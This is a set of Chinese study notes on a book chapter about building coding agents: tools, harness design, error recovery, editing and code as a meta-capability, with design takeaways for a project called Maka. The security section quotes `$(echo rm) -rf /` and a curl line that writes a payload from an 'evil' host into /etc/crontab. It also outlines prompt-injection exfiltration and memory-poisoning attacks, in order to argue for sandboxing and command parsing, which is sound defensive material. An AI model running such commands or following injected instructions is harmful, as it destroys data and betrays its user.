# 第 5 章 · Coding Agent 与代码生成 —— 知识点提取

> 来源：`book/chapter5.md`。章节主线：**一个能处理任意任务的通用 Agent，其架构核心是一个 Coding Agent 加上文件系统**——文件系统是 Agent 存储代码、数据、记忆和中间结果的工作空间。前半部分讲如何构建可靠的 Coding Agent；后半部分论证代码生成是**元能力**，展开其在编程之外的六个发挥方向。

## 第一部分：Coding Agent

### [KP-05-01] Coding 是 Agent 的基础能力
- **一句话核心**：代码生成不是少数专门化 Agent 的专利，而是每个通用 Agent 都该具备的基础能力；在当前 SOTA 模型下，具备基本 coding 能力不需要复杂架构。
- **关键设计要点**：典型任务五类核心动作（浏览目录 ls/glob、读取 read、修改 edit/write、运行 bash、查找 grep/search）；**基础 Coding Agent 只需七个核心工具**（Code Interpreter 隔离沙盒 + Bash + 读 + 写 + 编辑 + Glob + Grep）——"完整但极简"、几乎任何系统可低成本集成；组合威力（TODO 清单只用 Grep+Write 即可）。
- **Maka 设计启示**：Read/Write/Edit/Bash 正是七工具核心子集，天然具备成为 Coding Agent 工作台的底座；Code Interpreter 沙盒、Glob、Grep 应作为一等公民内置而非外部补丁。
- **可写设计文档**：《Maka Coding 工具集设计：七个核心工具与运行时集成》

### [KP-05-02] 从 Manus 到 OpenClaw：通用 Agent 的 Coding 内核
- **一句话核心**：**Coding Agent 加上文件系统，是开放任务型通用 Agent 最核心的技术基础**；文件系统不仅是数据存储，更是 Agent 记忆、知识和能力的中枢。
- **关键设计要点**：为何 Coding 是核心而非 Deep Research/Computer Use——几乎所有高效内容生成最终落到代码上（PPT 是 OOXML 代码、数据分析用 Python、浏览器操作可固化为 RPA 代码）；OpenClaw 典型执行流 5 步（读记忆→调工具→写代码→生成产物→更新记忆）；记忆设计：长期记忆存 `MEMORY.md`（高层事实+用户偏好）+ 按日期归档 Markdown 日志——选 Markdown 而非向量库三理由（用户可直接读改、保留时间顺序、可 Git 回滚）；**SOUL.md（身份/行为规则）vs MEMORY.md（跨会话经验）**分工；适用边界：Coding 为核心适用于**开放任务**通用 Agent，垂直客服 Agent 空间封闭代码只是工具之一——但**具备 coding 能力是所有 Agent 的共同底线**。
- **Maka 设计启示**："Log is the Runtime"与 OpenClaw"文件系统是中枢"同构；Event Log 是机器可读事实、Markdown 视图是人可读可改的投影；持久记忆应明确区分"记录/证据"与"可靠知识"（避免把一次记录自动升格为事实）。
- **可写设计文档**：《Maka 持久记忆与 Workspace 中枢设计》

### [KP-05-03] Coding Agent 整体流程
- **一句话核心**：把软件工程最佳实践投射到 Agent 的工程化流程——**计划先于行动、验证贯穿始终、文档与代码共同演化**。
- **关键设计要点**：项目文档化（首次接触仓库先建认知框架；知识显式化是高效协作前提）；**项目指令文件**（CLAUDE.md/AGENTS.md/.cursorrules 会话开始自动注入=项目级系统提示词、承载构建测试命令/代码风格/禁区；从上下文工程看是最经济的**稳定前缀**、KV Cache 友好）；AI-ready 代理指标（"一个远程新人只靠代码仓库和文档能否独立开展工作"）；任务理解与需求澄清（复杂需求需探索性调研澄清边界）；**设计文档**（回答改哪些模块/方案/新依赖/影响，为人类提供高效介入点，完成后交用户审查批准）；实现与测试（**以"测试通过"而非"代码写完"作为完成标准**——最常见的偷懒=写完不跑测试就报告完成；自我代码审查可跑 lint 或调用专门审查 Sub-Agent）；文档同步（过时文档比没有文档更糟）。
- **Maka 设计启示**：TaskRun/Event Log 天然承载"设计文档"artifact 与"测试通过=终止事实"的完成标准（终止事实进日志成为可审计证据）；可为复杂任务提供阶段化工作流模板（文档化→设计→批准→实现→测试→同步）。
- **可写设计文档**：《Maka 任务生命周期：设计-实现-验证的 Loop 工程流程》

### [KP-05-04] Harness 工程在 Coding Agent 中的实践
- **一句话核心**：Coding Agent 是所有任务中**可验证性最高**的一类，软件工程几十年基础设施天然构成强大 Harness；能否稳定运行不取决于模型多强，而取决于基础设施多扎实。
- **关键设计要点**：Harness 四组件（验收基线/执行边界/反馈信号/回退手段）；**四象限**（任务清晰度×验证自动化——目标明确+可自动验证=最佳区域；目标模糊+可自动验证=高效地跑偏；Harness 目标是尽可能推向"目标明确+验证自动化"象限）；业界实践（大规模迁移：知识必须存在于代码库本身、约束编码进 Linter/CI 而非文档、验证纠正全链路自动化；LangChain 用 Agent 分析失败轨迹改进 Harness——数据驱动；Anthropic 长任务=初始化 Agent+执行 Agent）；**四条可迁移原则**（约束优先于指导/验证要自动化/反馈越快越好越结构化越好/回退要可靠）；**约束的另一层目的——防过程性错误**（结果正确用错误方法也不行；约束的是动作而非仅结果）；**故障边界控制**（并行调用下故障只在同一批内传播、不上升父级）。
- **Maka 设计启示**：直接支撑"Feedback is not fact authority"——验证要自动化、反馈结构化，但反馈/自检只是证据不自动成为系统事实；Maka 可内置 lint/test 作为验证工具、反馈信号写入 Event Log，危险动作设置审批与执行边界。
- **可写设计文档**：《Maka Harness 组件：验收基线、执行边界与反馈信号》

### [KP-05-05] 故障与错误恢复
- **一句话核心**：**Agent 的可靠性不取决于它犯不犯错，而取决于每类错误是否都有对应的检测、恢复与终止路径**；错误处理的边界不是单次请求，而是整个恢复循环。
- **关键设计要点**：四层故障分类学（API 层：限流/超时/输出截断；工具层：幻觉调用/参数畸形/工具反复返回同一错误而模型原样重试；上下文层：窗口溢出/压缩失败/轨迹损坏；控制流层：死循环/死亡螺旋）；**检测：先分类再计数**（可重试 vs 不可重试——"值不值得重试"而非"要不要重试"）；模式检测（重复调用指纹、连续失败计数）；**活性与完整性监控**（流式最危险失败=静默卡死，需独立空闲看门狗——**每个长连接都需要活性信号，而非仅依赖连接超时**；工具调用缺配对结果自动修复，产品模式宽容修补、训练数据收集模式严格拒绝修复防污染）；**恢复：分级升级逐级透明**（①静默重试（指数退避+抖动、区分前台/后台——后台辅助失败直接放弃防重试放大）②降级与接续（输出触顶提升上限重发/追加元指令续写/降级备用模型先剥离私有格式）③暴露给用户（自动手段用尽才呈现+附已尝试动作））；**工具层错误不终止会话、把错误变成模型输入**（错误以普通工具结果身份进上下文由模型下轮纠正）；**错误处理的边界是恢复循环**（恢复期间扣留错误消息、成功则消费者无感知、全败才释放）；**终止：每条恢复路径都要有上限**（熔断阈值来自产线数据——Claude Code 压缩熔断"连续 3 次"来自真实会话统计，无效重试每天全球浪费约 25 万次 API 调用）；死亡螺旋防护（错误路径禁用会再调模型的副作用+递归深度计数器+全局终止升级：最大迭代/预算/连续失败超阈值升级人工）。
- **Maka 设计启示**：直接映射"Task may outlive a Turn"——TaskRun 内置故障分类表、重复调用指纹检测、熔断器与预算上限；Event Log 是检测"重复指纹/死亡螺旋"的最佳数据源。
- **可写设计文档**：《Maka 故障恢复：检测、分级恢复与熔断终止》

### [KP-05-06] Coding Agent 实现技巧（搜索-读取-编辑循环）
- **一句话核心**：五个实现技巧——并行与流式、上下文精细管理、环境感知、命令状态持久化、即时反馈——让 Agent 像经验丰富的开发者一样流畅工作。
- **关键设计要点**：**并行工具调用、流式执行与级联中止**（首个参数完整即执行、相互独立并行、默认否失败安全、失败级联中止同批依赖不波及独立调用）；上下文精细化管理（**返回内容附加行号标注每行以实际行号为前缀**——模型可精确引用"src/main.py 第 42 行"；命令输出保留头尾+中间省略+存临时文件）；**环境信息动态注入**（每次推理前以状态栏形式注入 cwd/git 分支/最近提交/变更概览——不硬编码进静态 system prompt 破坏 KV Cache）；**命令执行环境状态持久化**（持久化终端会话共享 cwd/环境变量，cd 后不丢）；**即时语法反馈**（文件写入完成工具层自动跑 linter、结果作为工具返回值一部分——像 IDE 打错括号立刻画红线）；**搜索-读取-编辑循环**（grep/glob 定位→行号 read 读取→字符串首尾匹配 edit→写后 lint→回搜索验证）。
- **Maka 设计启示**：Read/Write/Edit/Bash 可直接内置这些"低成本高回报"特性（行号标注、输出截断+持久化、写后自动 lint、持久终端会话）；Agent 状态栏做成 Event Log 投影视图（保证环境感知又不破坏"日志为唯一事实源"）。
- **可写设计文档**：《Maka 实现技巧：行号标注、输出截断与即时 lint 反馈》

### [KP-05-07] Coding Agent 中的搜索工具
- **一句话核心**：四类互补搜索工具（正则/glob/语义/符号）按"从粗到细、从语义到语法"渐进式组合使用。
- **关键设计要点**：正则内容匹配（grep/ripgrep，只找文本匹配不懂语义）；文件名模式匹配（glob，最快、探索项目结构第一步）；语义代码搜索（结构感知分块按函数/类完整语义单元切分+混合检索 reranker；适合探索性任务）；**索引路线之争**：Claude Code 式终端型**刻意不建嵌入索引**（纯 agentic grep+glob 现场检索——避免索引陈旧、省基础设施、避免把代码嵌入外发第三方服务=local-first 安全考量），Cursor 式 IDE 型走相反路线；符号级定义引用（LSP 跳转定义，重构关键——重命名不能靠文本搜索）；组合策略（先语义→正则→符号）。
- **Maka 设计启示**：默认提供 grep+glob 现场检索（local-first、不建索引、不外发代码）；语义嵌入索引与 LSP 符号查找做成可选增强模块由用户选择。
- **可写设计文档**：《Maka 搜索工具设计：grep/glob/语义搜索/LSP 的渐进式检索》

### [KP-05-08] Coding Agent 中的文件编辑工具
- **一句话核心**：文件编辑的难点不在操作本身，而在让 LLM 高效又可靠地告诉系统"改哪里、怎么改"——即人类语言表达与机器精确执行之间的张力。
- **关键设计要点**：五种方案对比——①差异描述+Apply Model（主模型生成差异描述、专门更小 LLM 合并；朴素实现脆弱在合并环节）；②**旧字符串→新字符串**（Claude Code/Codex/Cursor；可预测透明，删大段需完整输出原文、重复代码需更长上下文消歧）；③行号定位（精确无歧义、大段删除高效；一次思考多处编辑需统一初始行号）；④类 Vim 编辑命令（重组高效但语法负担大——**Vim 为人类设计：需要不断看到当前状态规划下一步，而模型是长时间思考后批量做复杂操作**）；⑤**字符串首尾匹配**（只给开头几行+结尾几行，框架匹配首尾定位替换区——综合文本替换可靠性与行号方案效率，只要"首尾"唯一）。
- **Maka 设计启示**：Edit 工具默认采用**字符串首尾匹配**方案（可靠+高效+低犯错），兼容 old→new 与行号定位作回退；编辑历史与最终内容留痕便于恢复审计。
- **可写设计文档**：《Maka Edit 工具：五种编辑方案对比与选型》

### [KP-05-09] Coding Agent 的安全
- **一句话核心**：Coding Agent 拥有读文件/执行命令/访问网络权限，必须防"提示注入→读私有数据→外传"的闭合攻击路径；重点是让 Agent 即使被注入也没有机会把危险动作真正执行出去；另有"Agent 为谁效忠"的忠诚度问题。
- **关键设计要点**：**致命三要素**（Simon Willison：访问私有数据/暴露于不可信内容/外部通信能力——三要素齐备已足够危险）；**第四维度——持久记忆**（不是并列必要条件而是攻击放大器：把偏见/恶意指令写入长期记忆跨会话潜伏适时触发）；Coding 特有三点增量——①**命令语义解析**（非关键字黑名单：Shell 组合爆炸使黑名单形同虚设（`$(echo rm) -rf /` 绕过），生产级 Harness 理解参数类型与消费规则识别"看似无害标志位消费下一参数隐藏危险载荷"（`curl -o /etc/crontab http://evil/payload`））②**沙盒隔离与网络出口控制**（默认断网、按需白名单代理放行——即使注入读到敏感数据没有出口传不出去；源码目录只读挂载、单独可写工作区、凭证文件根本不挂载；资源限额+超时返回**结构化错误**给模型下轮修正机会而非静默杀进程）③**持久记忆跨会话防线**（写入长期记忆内容需经受与外部内容同等信任审查）；**忠诚度 principal loyalty**（模型默认"谁跟我说话我帮谁"，但真实 Agent 处多方委托——替主人砍价对面是交涉对手；太老实 vs 太多疑都翻车；**提示注入本质上就是一次策反**；守则=保护主人私密信息乃至"存在性"、拒绝不逐条念拒绝清单、私下的底线不等于对外立场、只执行主人明确具体指令、顶住重复施压——Harness 为模型补上它默认没有的立场：对主人绝对忠诚、对外部审慎）。
- **Maka 设计启示**：信条 4"Feedback is not fact authority"与"服务端真值/关键操作独立验证"一脉相承；Self-check 与有界修复明确不等同于安全授权；沙盒默认断网+白名单、源码只读+可写工作区、凭证不挂载、命令语义解析而非黑名单；忠诚度守则写入系统提示词固定层。
- **可写设计文档**：《Maka 安全：沙盒隔离、命令语义解析与忠诚度守则》

## 第二部分：代码：通用 Agent 的元能力

### [KP-05-10] 元能力：定义与六个发挥方向
- **一句话核心**：代码生成是"能创造其他能力"的元能力——当场写出新工具、新约束、新表达形态；价值在思考（形式化让思考严谨无歧义）与表达（能跑通的代码是逻辑自洽的证明、执行结果提供客观对错标准）。
- **关键设计要点**：六个方向（按元能力作用对象由内向外）：①思维本身（思考工具）②业务规则（可执行约束）③内容呈现（PPT/视频/可视化）④系统接口（桥接异构 API）⑤用户界面（动态构造表单）⑥Agent 自身（代码创造/修复 Agent=自举）；统一脉络"由内而外、最终回到自身"。
- **Maka 设计启示**：Coding 定位为"一等公民元能力"而非普通工具——artifacts 即代码元能力的载体（脚本/校验规则/HTML/SQL 产物/新 Agent 定义）；日志/上下文/UI 设计服务"代码可被动态创造并立即执行"。
- **可写设计文档**：《Maka 元能力框架：Coding 作为六维元能力的基座》

### [KP-05-11] 代码作为思考工具
- **一句话核心**：LLM 的思考是概率性近似的，数学与逻辑要求确定性精确；分工=让 LLM 理解问题写代码、让代码解释器/符号计算引擎负责精确计算。
- **关键设计要点**：数学题（纯自然语言误算 vs `only_phys = phys - both` 正确）；符号计算协同（Wolfram 保持精确形式 vs LLM 自然语言理解——LLM 识别数学结构转为形式化语言交给 SymPy/约束求解器）；实验 5-1（Code Interpreter 配 sympy/scipy/numpy AIME 显著更高）；实验 5-2（python-constraint 逻辑谜题 K&K 90%+）；**模型-脚手架此消彼长规律**（模型强脚手架可更薄、模型弱脚手架要做更多；评估前提：同一套脚手架配不同能力模型结论可能截然不同）。
- **Maka 设计启示**：内置带数学库的 Python Code Interpreter 沙盒作为标准工具；模型选型/预算策略意识到"脚手架厚度"随模型能力动态调整。
- **可写设计文档**：《Maka Code Interpreter 工具：数学与逻辑推理的精确计算后盾》

### [KP-05-12] 代码作为业务规则的约束
- **一句话核心**：把业务规则从自然语言文档转化为可执行代码，成为系统行为的强制约束而非建议性指南；真正价值在防止不可逆的错误操作，最后一道防线必须建立在模型无法伪造的数据之上。
- **关键设计要点**：自然语言规则 vs 代码化规则**互补而非替代**（提示词规则可向用户解释政策/找变通方案/调用前预判可行性；代码校验精确无歧义、适合复杂规则组合）；**合并校验与执行（τ-bench 航空取消政策）**——第一层：参数作为思考的 checklist（工具描述列出完整政策+`expected_*` 参数促使模型把判断依据显式写出、必须先查订单——填写参数过程即强制 checklist）；第二层：**服务端真值校验才是守门员**（舱位/保险/时间/状态全部由服务端查数据库、时间取服务端时钟，**没有任何政策事实来自模型自报参数**——模型可能幻觉或被注入操纵；自报与真值不一致时记录告警）；三重保障（提示词规则→工具描述+checklist→服务端真值代码化校验）；**独立性不仅指独立的模型，更指独立的数据来源**。
- **Maka 设计启示**：与信条 4 高度一致——模型自报（Self-check 的 expected_*）只是证据与有界修复机会；服务端真值=Maka 中 Event Log 里的工具结果/终止事实权威；校验类工具"先查真值再裁决"，时间等关键量取系统时钟。
- **可写设计文档**：《Maka 规则引擎：checklist 引导 + 数据层真值守门》

### [KP-05-13] 代码驱动多媒体生成（提议者-审核者机制）
- **一句话核心**：把 PPT/视频等复杂文档创作重构为代码生成问题，绕开 GUI 视觉定位难题；以提议者-审核者双 Agent 机制引入视觉质量反馈，实现可终止的迭代改进。
- **关键设计要点**：PPT（Slidev=Markdown+HTML 定义内容，Agent 友好）；Agent 写完代码不知道实际渲染效果→Proposer-Reviewer 机制（Proposer 生成 Slidev 代码；Reviewer 运行代码渲染为图片、用 **Vision LLM** 分析产出**结构化改进建议**（含页码/问题类型/严重程度，非模糊"不好看"）；迭代至质量达标或最大次数（如 5 轮）——"质量达标"与"最大轮数"=Loop 工程两类显式终止条件）；与第四章事前审批同源（生成与审查分离）；**双 Agent 分工的核心优势在上下文管理**（Reviewer 只看最新渲染图、Proposer 只累积结构化文本反馈，单 Agent 上下文迅速超限）；视频编辑（Blender API+FFmpeg 结构化暴露功能）；**两步定位策略**（实验 5-6：粗粒度每 10 秒截图→细粒度每秒精确定位，起点误差 ≤3 秒）。
- **Maka 设计启示**：artifacts 承载 PPT/视频/HTML 多媒体产物；提供 Proposer-Reviewer 协作模板（子 Agent 模式+渲染/视觉反馈通道）；"结构化反馈作为特殊事件"接入 Event Log，多 Agent 迭代可回放可审计。
- **可写设计文档**：《Maka 多媒体 artifact 流水线：Proposer-Reviewer 迭代与两步视觉定位》

### [KP-05-14] 代码作为系统适配器
- **一句话核心**：当外部系统没有现成 SDK、接口不规范、格式随版本漂移时，Agent 当场生成适配代码，代码成为连接任意系统的"万能胶"；在可观测性场景具体化为自动跟随格式演化的日志解析与诊断。
- **关键设计要点**：万能胶能力（读接口文档或观察真实响应即时生成适配代码）；RPA 固化（对无 API 系统先 Computer Use 操作、再固化为 RPA 代码）；**日志解析自适应循环**（实验 5-7：前端遇到无法解析的日志格式→报告 Agent→Agent 生成解析代码→虚拟浏览器自动测试→热更新——自动跟随格式演化）；**日志诊断自动化**（实验 5-8：Agent 读生产日志+架构文档+PRD→判断是否符合预期→定位模块→生成结构化问题报告→**生成回归测试用例（引用问题轨迹 ID 和关键交互轮次）**→经 MCP 创建 GitHub Issue）。
- **Maka 设计启示**：与信条 1 直接呼应——Maka 的轨迹日志本身可被 Agent 自我解析/诊断/生成回归测试；artifacts 承载"解析代码"与"回归测试用例"，实现"日志→测试→Issue"自动化闭环。
- **可写设计文档**：《Maka 可观测性：日志自适应解析与轨迹诊断》

### [KP-05-15] 代码作为生成式 UI
- **一句话核心**：Agent 动态生成表单、图表甚至完整 Web 应用，把静态文本对话升级为丰富多模态交互；但对"生成任意代码作 UI"必须用安全机制兜底，动态生成软件需把信任边界下移到数据层。
- **关键设计要点**：**A2UI 类声明式协议**（Agent 只输出 JSON"界面描述清单"，客户端用预准备安全组件渲染——"顾客只能点菜单上有的菜，不能进厨房自己做"；AG-UI 是事件/传输协议与 A2UI 互补而非同类）；HTML 交付成果取代 Markdown 汇报（交互式演示/更好可视化/可持续完善的交付件）；澄清用户意图（级联表单一次填写避免多轮问答）；**SQL 查询 Artifact 模式**（Agent 生成 SQL 作为独立可执行产物、系统直接查库渲染成表格——**数据从数据库直达 UI 完全绕过 LLM 中间人**；执行层用只读账号/SELECT-only/拒绝 DDL/参数化/限时限额）；**动态生成软件 → 信任边界下移到数据层**（"即使 AI 写错了代码，权限约束仍然无法被绕过"——应用层可动态生成界面/流程，数据层用稳定经人工审查的机制强制"谁能对哪条数据做什么"：数据库行级安全、约束/校验器、受控视图/存储过程；每次读写携带受信任运行时绑定的**访问上下文**（用户/租户/角色/Agent 身份），动态代码只能以受限身份访问、不能获得可绕过规则的高权限凭证；所有数据访问路径都必须经过受信任数据层）。
- **Maka 设计启示**：artifacts 天然是 HTML 交付件与 SQL 产物的容器；"Log is the Runtime"为 artifact 模式提供事实底座（LLM 生成代码、系统执行、结果入日志、数据路径最短）；支持"SQL/可视化 artifact 由前端/数据层直接执行"的安全执行通道（只读账号、SELECT-only、参数化）；"数据层信任边界+访问上下文"纳入 workspace 安全模型。
- **可写设计文档**：《Maka Artifact 交付模式：HTML/SQL 产物与数据层安全边界》

### [KP-05-16] 代码创造代码：Agent 自举
- **一句话核心**：Agent 能用代码修复和创造同类 Agent；自我修复（OpenClaw doctor）是自举前提，而让 Agent 编写高质量 Agent 的最有效路径是"基于范例的生成"——复制并适应性修改，而非从零开始。
- **关键设计要点**：**OpenClaw doctor（Agent 修复 Agent）**——确定性检查（配置异常/状态问题/服务健康，安全修复自动执行、有风险操作需确认）+ LLM 兜底疑难（错误日志分析/配置语义理解/因果推断/针对性修复）两层配合；**让 Agent 编写 Agent 的常见缺陷**（需领域知识否则强模型也造出架构缺陷：上下文管理随意性、工具设计不规范、技术选型滞后、外部生态脱节）；**最有效路径=提供高质量 Agent 实现作为参考范例**（范例代码本身就是最佳实践载体，在范例上改比从零写更容易做对）；"自我复制并适应性修改"模式（复制自己代码→调提示词匹配新角色→替换工具→保留架构框架——基因复制加变异）。
- **Maka 设计启示**：Coding 能力可自我修复自身运行时（内置 doctor：确定性自检+LLM 兜底），修复动作按风险分级并留痕到 Event Log；自身代码/适配器作为"参考范例"支持用户生成新 Agent，形成"Log is the Runtime+自举"闭环。
- **可写设计文档**：《Maka 自举：自我修复与基于范例的 Agent 生成》

## 本章金句 / 核心结论
- "以开放任务为目标的通用 Agent，其核心是一个 Coding Agent 加上文件系统。"
- "Coding Agent 是当前所有 Agent 类型中成熟度最高的：不是因为代码生成模型特别强，而是因为软件工程几十年积累的基础设施天然构成了一套强大的 Harness。"
- "**Agent 的可靠性不取决于它犯不犯错，而取决于每类错误是否都有对应的检测、恢复与终止路径。**"
- "约束优先于指导：能用代码强制的规则就不要用文档建议。"
- "知识必须存在于代码库本身——Agent 看不到的等于不存在。"
- "错误处理的边界不是单次请求，而是整个恢复循环。"
- "把'测试通过'而非'代码写完'定义为完成标准。"
- "最后一道防线必须建立在模型无法伪造的数据之上——独立性不仅指独立的模型，更指独立的数据来源。"
- "提示注入本质上就是一次策反。"
- "动态生成软件的安全目标不能是'保证 AI 每次都把权限检查写对'，而应该是：**即使 AI 写错了代码，权限约束仍然无法被绕过**。"
- "每个长连接都需要活性信号，而非仅依赖连接超时。"

## 书中思考题（转录要点）
1. 代码生成是元能力但引入安全风险——沙盒限制能力，如何在安全性与能力间找平衡？
2. Agent 自举的代际错误累积——如何防止自举退化？
3. 日志解析自动跟随格式演化——如何区分"需要适应的变化"和"需要报告的异常"（bug）？
4. Reviewer 审美偏好与目标用户不一致时，反馈循环收敛到错误局部最优——如何让用户偏好参与 Reviewer 循环？
5. 经验沉淀为系统提示词规则会随时间膨胀——如何对规则做"垃圾回收"？为什么一次成功修改不能直接视为持续进化？
6. "AI-ready"代理指标：你的团队在知识文档化上距离还有多远？
7. 四要素（致命三要素+持久记忆）生产环境如何设计安全策略？
8. Artifact 模式让生成 SQL/HTML 直接执行——如何确保安全性？
9. "代码即规则"（工具内部数据库真值校验+参数引导）相比自然语言规则的优势与局限？
10. "Agent 生成代码、系统执行代码" vs "Agent 直接给答案"的分工优劣？
